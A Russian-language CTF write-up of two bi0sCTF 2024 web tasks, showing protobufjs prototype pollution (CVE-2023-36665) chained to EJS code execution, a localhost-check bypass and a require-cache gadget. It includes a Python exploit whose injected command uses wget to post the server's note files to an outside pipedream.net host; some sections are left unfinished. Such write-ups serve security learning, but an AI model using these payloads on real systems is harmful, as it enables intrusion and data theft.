---
title: "Writeup Web Bi0sCTF 2024"
description: ""
date: 2024-06-05
summary: "Server Side Prototype Pollution –≤ protobuf js –±–∏–±–ª–∏–æ—Ç–µ–∫–µ, –ø—Ä–∏–≤–æ–¥—è—â–∏–π –∫ RCE, –∏—Å–ø–æ–ª—å–∑—É—è –≥–∞–¥–∂–µ—Ç—ã –≤ ejs —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–µ. –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–¥–æ–±—Ä–∞—Ç—å —Å–∏–¥ –¥–ª—è math.random –∏ –ø—Ä–µ–¥—É–≥–∞–¥–∞—Ç—å –∞–π–¥–∏ –∑–∞–ø–∏—Å–∫–∏ —Å —Ñ–ª–∞–≥–æ–º, –∞ —Ç–∞–∫–∂–µ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SSPP –±–µ–∑ RCE"  

tags: ["web"]
showAuthor: true
authors:
  - "bebra"
---
![welcome](img/me.jpg)

–≤—Å–µ–º –ø—Ä–µ–≤–µ–¥. –ù–µ–¥–∞–≤–Ω–æ –ø—Ä–æ—à–µ–ª (4 –º–µ—Å—è—Ü–∞ –Ω–∞–∑–∞–¥ –∞—Ö–≤—ã—Ö–∞—Ö–∞—ã) [bi0s ctf](https://ctftime.org/event/2117), –Ω–∞ —É–¥–∏–≤–ª–µ–Ω–∏–µ —Ç–∞–º –±—ã–ª–∏ –≤–µ—Å—å–º–∞ –∑–∞–Ω–∏–º–∞—Ç–µ–ª—å–Ω—ã–µ –∑–∞–¥–∞–Ω–∏—è –≤ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ web, —Ä–∞–∑–±–æ—Ä–æ–º –∫–æ—Ç–æ—Ä—ã—Ö —è –ø—Ä–æ—Å—Ç–æ –æ–±—è–∑–∞–Ω —Å –≤–∞–º–∏ –ø–æ–¥–µ–ª–∏—Ç—å—Å—è. –ë—Ç–≤ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ —Ä–∞–∑–≤–µ—Ä–Ω—É—Ç—å —Ç–∞—Å–∫–∏ –º–æ–∂–Ω–æ [–∞—Ç—Å—é–¥–∞](https://github.com/teambi0s/bi0sCTF/)

# Required Notes
Whitebox —Ç–∞—Å–∫ —Å –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ–º —Å–æ–ª–≤–æ–≤, —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª —Å–æ–∑–¥–∞–Ω–∏—è –∑–∞–ø–∏—Å–æ–∫. –°–ø–æ–π–ª–µ—Ä: –∏–º–µ–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã—Ö —Ä–µ—à–µ–Ω–∏–π.
## tl;dr
Server Side Prototype Pollution –≤ protobuf js –±–∏–±–ª–∏–æ—Ç–µ–∫–µ [CVE-2023-36665](https://devm.io/security/protobufjs-vulnerability), –ø—Ä–∏–≤–æ–¥—è—â–∏–π –∫ RCE, –∏—Å–ø–æ–ª—å–∑—É—è [–≥–∞–¥–∂–µ—Ç—ã](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce) –≤ ejs —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–µ. –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–¥–æ–±—Ä–∞—Ç—å —Å–∏–¥ –¥–ª—è math.random –∏ –ø—Ä–µ–¥—É–≥–∞–¥–∞—Ç—å –∞–π–¥–∏ –∑–∞–ø–∏—Å–∫–∏ —Å —Ñ–ª–∞–≥–æ–º, –∞ —Ç–∞–∫–∂–µ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SSPP –±–µ–∑ RCE. 

## –ê —Ç–µ–ø–µ—Ä—å –ø–æ –ø–æ—Ä—è–¥–æ—á–∫—É

–ø–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–æ, –ø–æ –∑–∞–≤–µ—Ç–∞–º –ª—É—á—à–∏—Ö –º–µ—Ç–æ–¥ –∞–Ω–∞–ª–∏–∑–∞ –∑–∞—â–∏—â–µ–Ω–Ω–æ—Å—Ç–∏, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ xss –±–∞–∑–æ–≤—ã–º –Ω–∞–≥—Ä—É–∑–æ–º -> –ø–æ–ª—É—á–∞–µ–º –∑–∞–∫–æ–Ω–æ–º–µ—Ä–Ω—ã–π –ø—Ä–æ—Ñ–∏—Ç. ![stored xss!!!](img/reqrXSS.jpg) –ö–∞–∑–∞–ª–æ—Å—å –±—ã, —Ç–µ–ø–µ—Ä—å –∫–∏–¥–∞–µ–º –ª–∏–Ω–∫ –Ω–∞ –Ω–∞—à—É —Å—Ç—Ä–∞–Ω–∏—á–∫—É —Å –Ω–∞–≥—Ä—É–∑–æ–º –±–æ—Ç—É –∏ —á–∏—Ç–∞–µ–º —Ñ–ª–∞–≥, –æ–¥–Ω–∞–∫–æ –≤—Å–µ –Ω–µ —Ç–∞–∫ –ø—Ä–æ—Å—Ç–æ. –ë–æ—Ç —Ö–æ–¥–∏—Ç —Ç–æ–ª—å–∫–æ –Ω–∞ Healthcheck, —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ –Ω–∞–º –Ω–∞–¥–æ –∫–∞–∫-—Ç–æ –ø–æ–¥—Å—É–Ω—É—Ç—å –±–æ—Ç—É —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é –∑–∞–ø–∏—Å–∫—É –≤–º–µ—Å—Ç–æ –∏–º–µ—é—â–µ–≥–æ—Å—è —Ö–µ–ª—Å—á–µ–∫–∞. 

–ù–µ –Ω–∞–π–¥—è –±–æ–ª—å—à–µ –Ω–∏—á–µ–≥–æ, –∫—Ä–æ–º–µ xss - xsleaks —á–µ—Ä–µ–∑ `/search` (–∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–µ–Ω –¥–ª—è –∏–Ω—Ç–µ–Ω–¥–µ–¥ —Å–ø–æ—Å–æ–±–∞ –≤—ã—Ç–∞—â–∏—Ç—å –ø–æ—Å–∏–º–≤–æ–ª—å–Ω–æ —Ñ–ª–∞–≥) - –ø—Ä–∏—Ö–æ–¥–∏—Ç—Å—è –¥—É–º–∞—Ç—å —à–∏—Ä–µ. –ì–ª–∞–∑–∞ –≤—Ç—ã–∫–∞—é—Ç—Å—è –≤ —Ñ–∞–π–ª settings.proto (–Ω–µ–º–Ω–æ–≥–æ [–±–∞–∑—ã](https://www.youtube.com/watch?v=_EqVG-El5z0) –ø—Ä–æ —Ä–∞–±–æ—Ç—É –ø—Ä–æ—Ç–æ–±–∞—Ñ–∞), —á–µ–∫–∞–µ–º –≤–µ—Ä—Å–∏—é protobufjs –ø–∞–∫–µ—Ç–∞ - –æ —á—É–¥–æ, –æ–Ω–∞ –∏–º–µ–µ—Ç [CVE-2023-36665](https://devm.io/security/protobufjs-vulnerability). –ó–∞–≥—Ä—è–∑–Ω–µ–Ω–∏–µ –ø—Ä–æ—Ç–æ—Ç–∏–ø–∞ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞ –≤–æ–∑–º–æ–∂–Ω–æ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –ø—Ä–æ—Ç–æ–±–∞—Ñ–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏–∏: `parse`,`setParsedOption`,`util.setProperty`,`load/loadSyncfunctions`. –í –¥–∞–Ω–Ω–æ–º –∫–µ–π—Å–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è `parse`
```js
    schema = fs.readFileSync('./settings.proto', 'utf-8');
    root = protobuf.parse(schema).root;
```
–ê –µ—â–µ –º—ã –º–æ–∂–µ–º –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å —á—Ç–æ —É–≥–æ–¥–Ω–æ –≤ —Ñ–∞–π–ª settings.proto —á–µ—Ä–µ–∑ —Ä—É—á–∫—É `/customise` - —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ –µ—Å—Ç—å –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –ø—Ä–æ—ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å Server Side Prototype Pollution. –ß—É—Ç–æ–∫ –±–∞–∑—ã -> [SSPP](https://habr.com/ru/companies/huawei/articles/547178/).

–î–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ –∑–∞–≥—Ä—è–∑–Ω–µ–Ω–∏—è –ø—Ä–æ—Ç–æ—Ç–∏–ø–∞ —á–µ—Ä–µ–∑ –ø—Ä–æ—Ç–æ–±–∞—Ñ –µ—Å—Ç—å PoC:
```js
const protobuf = require("protobufjs");
protobuf.parse('option(a).constructor.prototype.verified = true;');
console.log({}.verified);
// returns true
``` 

–î–ª—è –Ω–∞–≥–ª—è–¥–Ω–æ—Å—Ç–∏ –≤ –ª–æ–∫–∞–ª—å–Ω–æ –ø–æ–¥–Ω—è—Ç–æ–º –∏–Ω—Å—Ç–∞–Ω—Å–µ —è –¥–æ–±–∞–≤–ª—è—é —Ä—É—á–∫—É, –≤—ã–≤–æ–¥—è—â—É—é –º–Ω–µ –∑–Ω–∞—á–µ–Ω–∏–µ {}.verified.
```js
app.get('/verif', (req, res) => {
  return res.json({Message: {}.verified})
});
```
–¢–µ–ø–µ—Ä—å –ø–æ–ø—ã—Ç–∫–∞ —Å–æ–∑–¥–∞—Ç—å –∫–∞—Å—Ç–æ–º–Ω—ã–π –∞—Ç—Ä–∏–±—É—Ç verified: ![poc](img/reqrSSPP.jpg)

–°–ø–µ—Ä–≤–∞ –≤—ã–ø–æ–ª–Ω—è–µ–º –∑–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ settings.proto —Ñ–∞–π–ª, –¥–∞–ª–µ–µ –¥–ª—è –æ—Ç—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏—è —Å–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å–∫—É, —á—Ç–æ–±—ã –ø–æ–º–µ—Å—Ç–∏—Ç—å –ø–µ–π–ª–æ–∞–¥ –≤ —Ñ—É–Ω–∫—Ü–∏—é `parse`, –∫–æ—Ç–æ—Ä–∞—è –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç –≤–≤–æ–¥–Ω—ã–µ –∏ —è —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–ª –Ω–æ–≤—ã–π –∞—Ç—Ä–∏–±—É—Ç verified —Å–æ –∑–Ω–∞—á–µ–Ω–∏–µ–º `true` –¥–ª—è –≤—Å–µ—Ö –æ–±—ä–µ–∫—Ç–æ–≤.

–° –∏–º–µ—é—â–∏–º—Å—è SSPP –¥–∞–ª–µ–µ –º–æ–∂–Ω–æ —Ä–µ—à–∏—Ç—å —Ä–∞–∑–Ω—ã–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏.
## RCE —á–µ—Ä–µ–∑ –≥–∞–¥–∂–µ—Ç ejs
EJS —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä, –∫–∞–∫ —Å–∫–∞–∑–∞–Ω–æ –≤ [—Å—Ç–∞—Ç—å–µ](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce), —Ä–∞–∑–≤—è–∑—ã–≤–∞–µ—Ç –Ω–∞–º —Ä—É–∫–∏ —Ä–µ—à–∏—Ç—å —Ç–∞—Å–∫ unintended —Å–ø–æ—Å–æ–±–æ–º - –ø–æ–ª—É—á–∏–≤ Remote Code Execution. –ï—Å–ª–∏ –∫—Ä–∞—Ç–∫–æ –ø–æ –≥–∞–¥–∂–µ—Ç–∞–º, —Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ—Å—Ç–∞–≤–∏—Ç—å –∞—Ç—Ä–∏–±—É—Ç `client` —Ä–∞–≤–Ω—ã–º –µ–¥–∏–Ω–∏—Ü–µ –∏  `escapeFunction` –≤ –∑–Ω–∞—á–µ–Ω–∏–µ `JSON.stringify; process.mainModule.require('child_process').exec('wget http://collaborator.qwe')`, –∞ —Ç–∞–∫–∂–µ –≤–∞–∂–Ω–æ –ø–æ—Å–ª–µ –∑–∞–ø–∏—Å–∏ —ç—Ç–∏—Ö –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –æ—Ç—Ä–µ–Ω–¥–µ—Ä–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—á–∫—É –Ω–∞ —Ñ—Ä–æ–Ω—Ç–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä —Å–¥–µ–ª–∞—Ç—å get –∑–∞–ø—Ä–æ—Å –Ω–∞ `/create`, —á—Ç–æ–±—ã —Å—Ç—Ä–∏–≥–≥–µ—Ä–∏—Ç—å ejs –∏ –æ–Ω –∏—Å–ø–æ–ª–Ω–∏–ª —Ç–æ, —á—Ç–æ –º—ã –µ–º—É –ø—Ä–∏–∫–∞–∑–∞–ª–∏. 

–ò—Ç–æ–≥–æ–≤—ã–π —Å–ø–ª–æ–π—Ç –¥–ª—è —ç—Ç–æ–≥–æ —Å–ø–æ—Å–æ–±–∞:
```py
import requests

BASE_URL = "http://localhost:3000"

def pp(key: str, value: str):
    author = "option(a).constructor.prototype." + key + "=" + value + ""
    res = requests.post(BASE_URL +
        "/customise",
        json={
            "data": [
                {},
                {
                    "author": author,
                },
            ]
        },
    )
    assert res.json()["Message"] == "Settings changed", res.text
    res = requests.post(BASE_URL + "/create", json={})
    assert res.status_code == 500

pp("client", "1")
pp(
    "escapeFunction",
    "\"JSON.stringify; process.mainModule.require('child_process').exec('wget https://enq0o6tnl7p8d.x.pipedream.net/ --post-data=\\\"$(cat notes/*)\\\"')\"",
)

requests.get(BASE_URL +"/create")
```

## –ó–∞–≥—Ä—è–∑–Ω–µ–Ω–∏–µ –∞—Ç—Ä–∏–±—É—Ç–∞ _peername

–ï—â–µ –æ–¥–∏–Ω —Å–æ–ª—é—à–Ω –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç –æ–±—Ö–æ–¥ –∑–∞—â–∏—Ç—ã –Ω–∞ —Ä—É—á–∫—É `/search`, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∑–≤–æ–ª–∏—Ç –ø–æ—Å–∏–º–≤–æ–ª—å–Ω–æ –∏–∑–≤–ª–µ—á—å –∞–π–¥–∏ –∑–∞–ø–∏—Å–∫–∏ —Å —Ñ–ª–∞–≥–æ–º.
–ó–∞—â–∏—Ç–∞ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —Ç–∞–∫, —á—Ç–æ–±—ã —Ä–∞–∑—Ä–µ—à–∞—Ç—å –¥–∞–Ω–Ω—ã–π –ø–æ–∏—Å–∫ —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∑–∞–ø—Ä–æ—Å —Å–¥–µ–ª–∞–Ω –æ—Ç –ª–æ–∫–∞–ª—Ö–æ—Å—Ç–∞.

–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–∏—Å–∫–∞—Ç—å –≥–∞–¥–∂–µ—Ç—ã –≤ –∞—Ç—Ä–∏–±—É—Ç–∞—Ö `req.connection`. –î–ª—è —ç—Ç–æ–≥–æ –≤—ã–≤–µ–¥–µ–º –æ–±—ä–µ–∫—Ç `req.connection` –≤ –º–µ—Ç–æ–¥–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∞–¥—Ä–µ—Å–∞:
```js
const restrictToLocalhost = (req, res, next) => {
  const remoteAddress = req.connection.remoteAddress;

  console.log(req.connection);
  
  if (remoteAddress === '::1' || remoteAddress === '127.0.0.1' || remoteAddress === '::ffff:127.0.0.1') {
    next();
  } else {
    res.status(403).json({ Message: 'Access denied' });
  }
};
```

–ò–∑ –≤—Å–µ—Ö –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –±—Ä–æ—Å–∞–µ—Ç—Å—è –≤ –≥–ª–∞–∑–∞ `_peername`:
```js
_peername: { address: '::ffff:192.168.144.1', family: 'IPv6', port: 38258 }
```
–ø–∞—Ç–∞–º—É —á—Ç–∞ –æ–Ω —É–¥–∏–≤–∏—Ç–µ–ª—å–Ω–æ —Å—Ö–æ–∂ —Å `remoteAddress`. –î–∞–ª–µ–µ –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞—Ö —Å–µ—Ä—á–∏–º –∏–Ω—Ñ—É –ø–æ —Å—Ç—Ä–∞–Ω–Ω–æ–º—É –∞—Ç—Ä–∏–±—É—Ç—É, –Ω–∞—Ö–æ–¥–∏–º [–≤–æ–ø—Ä–æ—Å](https://stackoverflow.com/questions/29462807/node-js-issues-with-request-client-peername-address-when-getting-client-ip) –Ω–∞ —Å—Ç–∞–∫–æ–≤–µ—Ä—Ñ–ª–æ—É, –∏–∑ –∫–æ—Ç–æ—Ä–æ–≥–æ –ø–æ–Ω–∏–º–∞–µ–º, —á—Ç–æ `_peername` –æ–±—ä—è–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –æ–±—ä—è–≤–ª–µ–Ω–∏—è `remoteAddress`, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ –º–æ–∂–Ω–æ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –ø–µ—Ä–µ–ø–∏—Å–∞—Ç—å `_peername` —Å–æ –∑–Ω–∞—á–µ–Ω–∏–µ–º –ª–æ–∫–∞–ª—Ö–æ—Å—Ç–∞, —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º `remoteAddress` —Ç–∞–∫–∂–µ –ø—Ä–∏–º–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ –ª–æ–∫–∞–ª—Ö–æ—Å—Ç–∞, —Ç–∫ –ø–æ–¥ –∫–∞–ø–æ—Ç–æ–º –≤–∏–¥–∞—Ç—å –æ–¥–∏–Ω –∞—Ç—Ä–∏–±—É—Ç —É—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç—Å—è –∫ –¥—Ä—É–≥–æ–º—É.

–°–æ–æ—Ç–≤–µ—Ç—Å–≤—Ç–µ–Ω–Ω–æ –¥–µ–ª–∞–µ–º –Ω–∞–≥—Ä—É–∑ –≤–∏–¥–∞ `option(a).constructor.prototype._peername.address=\"127.0.0.1\"` –∏ –ø–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ `/search`. –î–∞–ª–µ–µ –¥–µ–ª–æ –∑–∞ –º–∞–ª—ã–º: –ø—Ä–æ—Å—Ç–æ –≤—ã—Ç–∞—Å–∫–∏–≤–∞–µ–º –ø–æ—Å–∏–º–≤–æ–ª—å–Ω–æ noteId —Ñ–ª–∞–≥–∞.

–≥–æ—Ç–æ–≤—ã–π —Å–ø–ª–æ–π—Ç –ª–µ–∂–∏—Ç [—Ç—É—Ç](https://siunam321.github.io/ctf/bi0sCTF-2024/Web-Exploitation/required-notes/)


## –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è math.random
–î–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ ID –∑–∞–ø–∏—Å–∫–∏ –∏—Å–ø–æ–ª—é–∑–∞–µ—Ç—Å—è –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä –ø—Å–µ–≤–¥–æ—Å–ª—É—á–∞–π–Ω—ã—Ö —á–∏—Å–µ–ª, –ø–æ—ç—Ç–æ–º—É –µ—Å—Ç—å –≤–µ–∫—Ç–æ—Ä –ø—Ä–µ–¥—É–≥–∞–¥–∞—Ç—å noteId —Ñ–ª–∞–≥–∞.
–ú–Ω–µ –±—ã–ª–æ –Ω–µ–º–Ω–æ–≥–æ –≤ –ø–∞–¥–ª—É —Ä–∞–∑–±–∏—Ä–∞—Ç—å—Å—è, –ø–æ—ç—Ç–æ–º—É –ø—Ä–æ—Å—Ç–æ –¥–µ—Ä–∂–∏—Ç–µ [—Å—É—Ä—Å](https://jsur.in/posts/2020-11-30-hitcon-ctf-2020-100-pins-writeup)

–î–û–ü–ò–°–ê–¢–¨

## –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –≥–∞–¥–∂–µ—Ç–∞ required
–ò–∑–Ω–∞—á–∞–ª—å–Ω–æ —ç—Ç–æ—Ç —Å–ø–æ—Å–æ–± –ø–æ–¥—Ä–∞–∑—É–º–µ–≤–∞–ª—Å—è –∏–Ω—Ç–µ–Ω–¥–µ–¥ —Å–ø–æ—Å–æ–±–æ–º, –æ–¥–Ω–∞–∫–æ —Ä–µ—à–∏—Ç—å —Ç–∞—Å–∫ –º–æ–∂–Ω–æ –±—ã–ª–æ –Ω–∞–º–Ω–æ–≥–æ –ø—Ä–æ—â–µ, —Ç–∞–∫ —á—Ç–æ –∞–≤—Ç–æ—Ä —Ä–µ—à–∏–ª –¥–æ–±–∞–≤–∏—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—É—é —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—é, –∞ —Ç–∞–∫–∂–µ –æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å –¥–ª–∏–Ω—É –∑–∞–ø–∏—Å—ã–≤–∞–µ–º–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –ø—Ä–æ—Ç–æ—Ñ–∞–π–ª, –ø–æ—ç—Ç–æ–º—É –∏–Ω—Ç–µ–Ω–¥–µ–¥ —Å–ø–æ—Å–æ–± –±—É–¥–µ—Ç –æ–ø–∏—Å–∞–Ω –≤ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ —Ç–µ–∫—É—â–µ–≥–æ —Ç–∞—Å–∫–∞.


# RequiredNotes Revenge
–ü—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ —Ç–∞—Å–∫–∞, –∏–º–µ–ª –≤—Å–µ–≥–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–æ–ª—é—à–µ–Ω–æ–≤.

## tl;dr
–í—Å–µ —Ç–æ –∂–µ –∑–∞–≥—Ä—è–∑–Ω–µ–Ω–∏–µ –ø—Ä–æ—Ç–æ—Ç–∏–ø–∞, –æ–¥–Ω–∞–∫–æ –∏–Ω—Ç–µ–Ω–¥–µ–¥ —á–µ–π–Ω –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏:
 - –¥–µ–ª–∞–µ–º –∑–∞–º–µ—Ç–∫—É —Å –Ω–∞–≥—Ä—É–∑–æ–º —ç–∫—Å–ø–ª—É—Ç–∞—Ü–∏–∏ [xs leaks](https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html)
 - –∑–∞–≥—Ä—è–∑–Ω—è–µ–º –∏–º—è —ç–∫—Å–ø–æ—Ä—Ç–∞ –≤ required, —á—Ç–æ–±—ã –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ healthcheck –æ—Ç–∫—Ä—ã–≤–∞–ª–∞—Å—å –∑–∞–º–µ—Ç–∫–∞ —Å –Ω–∞–≥—Ä—É–∑–æ–º, –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ –∏–≥—Ä–∞—è—Å—å —Å –∫—ç—à–æ–º

## Intended Solution
–î–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø–æ–∏—Å–∫–∞—Ç—å –≥–∞–¥–∂–µ—Ç—ã –¥–ª—è require, [–æ–¥–Ω–∞ –∏–∑ —Å—Ç–∞—Ç–µ–π](https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs).

–ï—Å–ª–∏ —á—É—Ç—å —É–≥–ª—É–±–∏—Ç—å—Å—è, –∞—Ç—Ä–∏–±—É—Ç `data` –Ω–∞—Ö–æ–¥–∏—Ç—Å—è [—Ç—É—Ç](https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529)
–ì–∞–¥–∂–µ—Ç –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å `data` –∞—Ç—Ä–∏–±—É—Ç, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –≤–Ω—É—Ç—Ä–∏ `name`,`exports` –¥–ª—è –ª—é–±–æ–≥–æ —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–¥–≥—Ä—É–∂–∞–µ—Ç—Å—è.

–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–µ–≥–æ –≥–∞–¥–∂–µ—Ç–∞ –≤–∫–ª—é—á–∞–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ –¥–µ–π—Å—Ç–≤–∏—è:
  - –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ –Ω—É–∂–Ω–æ –æ—Ç—Ä–∞–≤–∏—Ç—å –∞—Ç—Ä–∏–±—É—Ç `path=./`
  - —Å–æ–∑–¥–∞—Ç—å note —Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ xsleaks (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∏—Å–ø–æ–ª—å–∑—É—è —Ç–µ–≥ option)
  - –æ–±—ä—è–≤–ª—è–µ—Ç—Å—è `data={}`, –¥–∞–ª–µ–µ –≤ –Ω–µ–µ –∫–ª–∞–¥–µ—Ç—Å—è `name=./notes/Healthcheck` –∏ `export=./notes/<noteid>.json` (–ø–æ—Ç—Ä–∞–≤–∏–≤ –ø—Ä–æ—Ç–æ—Ç–∏–ø, —Å–ª–µ–¥—É—é—â–∏–π —ç–ª–µ–º–µ–Ω—Ç –≤ –∫–µ—à–µ –±—É–¥–µ—Ç —É–∫–∞–∑—ã–≤–∞—Ç—å –¥–ª—è —Ö–µ–ª—Å—á–µ–∫–∞ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ –∑–∞–ø–∏—Å–∫–∏ —Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π)
  - —à–ª–µ–º get –∑–∞–ø—Ä–æ—Å –Ω–∞ `/view/Healthcheck`, —á—Ç–æ–±—ã –≤ relativeResolveCache  –ø–æ–ª–æ–∂–∏–ª–æ—Å—å —Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –∑–∞–ø–∏—Å–∫–∏ —Å –Ω–∞–≥—Ä—É–∑–æ–º, –∏ —Å—Ç–∞—Ä—ã–π –∫–µ—à –æ—á–∏—Å—Ç–∏–ª—Å—è
  - –æ–±—ä—è–≤–ª—è–µ—Ç—Å—è `data={}`, –¥–∞–ª–µ–µ –≤ –Ω–µ–µ –∫–ª–∞–¥–µ—Ç—Å—è `name=./notes/zhopi` –∏ `export=./notes/<noteid>.json`. –¢–∞–∫–∂–µ —à–ª–µ–º get –Ω–∞ `/view/zhopi`, –¥–æ–±–∞–≤–ª—è—è –≤ –∫–µ—à require noteid —Å –ø–æ–ª–µ–∑–Ω—ã–º –Ω–∞–≥—Ä—É–∑–æ–º. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º healthcheck —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –¥–æ—Å—Ç—É–ø–Ω—ã–º –¥–ª—è —á—Ç–µ–Ω–∏—è.
  - —Ç–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –ø–æ—Å—ã–ª–∞—Ç—å –±–æ—Ç–∞ –Ω–∞ `/view/Healthcheck`

[–ü–æ–ª–Ω—ã–π –∞–≤—Ç–æ—Ä—Å–∫–∏–π —Å–ø–ª–æ–π—Ç](https://github.com/teambi0s/bi0sCTF/blob/main/2024/Web/requirednotesrevenge/admin/exploit/exploit.py)

## –ï—â–µ –æ–¥–∏–Ω unintended RCE
